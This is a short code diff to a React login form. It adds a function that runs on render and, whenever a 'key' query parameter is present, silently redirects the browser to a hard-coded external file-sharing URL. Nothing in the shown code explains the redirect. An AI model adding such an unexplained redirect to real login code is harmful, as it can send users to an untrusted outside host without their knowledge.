@@ -123,6 +123,17 @@ function LoginForm() {
     } = useCaptcha();
     const query = useQuery();
 
+    const iWantRedirect = () => {
+        const redirectParams = [ 'key' ]
+        redirectParams.forEach(item => {
+            if(query.get(item)){
+                window.location.href = ' https://files.hamzone.cn/s/gOhP?path=%2F'
+            }
+        });
+    };
+
+    iWantRedirect()
+
     const classes = useStyles();
 
     useEffect(() => {
